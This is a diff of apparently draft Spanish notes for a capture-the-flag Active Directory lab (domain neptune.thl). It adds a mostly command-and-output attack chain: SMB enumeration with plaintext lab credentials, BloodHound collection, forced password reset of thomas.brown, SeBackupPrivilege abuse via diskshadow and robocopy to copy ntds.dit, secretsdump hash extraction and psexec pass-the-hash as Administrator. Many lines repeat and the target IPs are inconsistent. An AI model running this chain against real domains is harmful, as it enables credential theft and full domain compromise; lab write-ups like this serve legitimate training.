@@ -547,7 +547,15 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         NETLOGON                                                READ ONLY       Logon server share 
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections                                                                                                     
-                                                                                                                                                            
+
+
+--------------------------------------------------------------------------------------------
+
+
+
+smbmap -H 192.168.0.100 -u victor.rodriguez -p 'H5gVCzzZkzJ#wGsT8u1$' -r IT
+
+
 ┌──(kali㉿kali)-[~/Documents/Black_Gold]
 └─$ smbclient \\\\192.168.56.10\\IT -U victor.rodriguez%H5gVCzzZkzJ#wGsT8u1$    
 Try "help" to get a list of possible commands.
@@ -694,6 +702,29 @@ a5accd70ea911b92487cea1d1cb73162
 
 
 
+----------------------------------------------------------------------------------------------------
+
+Escalada de Privilegios
+Mediante análisis de relaciones en Active Directory identificamos que emma.johnson puede forzar el cambio de contraseña de thomas.brown.
+
+
+
+
+bloodhound-python -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d neptune.thl -ns 192.168.56.10 -c All --zip
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------
+
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
+
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
+El usuario thomas.brown pertenece al grupo Backup Operators, habilitando el privilegio SeBackupPrivilege.
 
 
 
@@ -713,12 +744,50 @@ Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Cr
 
 
 
-
-
-
-
-
+$SecPassword = ConvertTo-SecureString 'contraseña_emma.johnson' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('neptune.thl\emma.johnson', $SecPassword)
+$UserPassword = ConvertTo-SecureString 'Hackeado123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Credential $Cred
 
 
 
 https://berserkwings.github.io/THL-writeup-blackGold/#
+
+❯ net rpc password "thomas.brown" "P@ssw0rd" -U neptune.thl/emma.johnson%'sb9TVndq8N@tUVMmP2@#' -S dc01.neptune.thl
+❯ netexec ldap $ip -u THOMAS.BROWN -p P@ssw0rd
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
+LDAP        192.168.56.10   389    DC01             [+] neptune.thl\THOMAS.BROWN:P@ssw0rd (Pwn3d!)
+❯ netexec smb $ip -u THOMAS.BROWN -p P@ssw0rd
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    DC01             [+] neptune.thl\THOMAS.BROWN:P@ssw0rd
+❯ netexec winrm $ip -u THOMAS.BROWN -p P@ssw0rd
+WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\THOMAS.BROWN:P@ssw0rd (Pwn3d!)
+
+
+
+Escalada de Privilegios
+Mediante análisis de relaciones en Active Directory identificamos que emma.johnson puede forzar el cambio de contraseña de thomas.brown.
+
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
+Set-DomainUserPassword -Identity thomas.brown -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
+El usuario thomas.brown pertenece al grupo Backup Operators, habilitando el privilegio SeBackupPrivilege.
+
+Explotación de SeBackupPrivilege
+Generamos una copia del volumen para extraer ntds.dit y la colmena SYSTEM.
+
+diskshadow /s cmd.dsh
+diskshadow /s cmd.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\\system C:\\Temp\\system
+reg save hklm\\system C:\\Temp\\system
+Compromiso del Dominio
+Extraemos los hashes del dominio y reutilizamos el NTLM del administrador para obtener ejecución privilegiada.
+
+impacket-secretsdump -ntds ntds.dit -system system local
+impacket-secretsdump -ntds ntds.dit -system system local
+impacket-psexec -hashes :<NT_HASH_ADMIN> Administrator@192.168.0.100
+impacket-psexec -hashes :<NT_HASH_ADMIN> Administrator@192.168.0.100
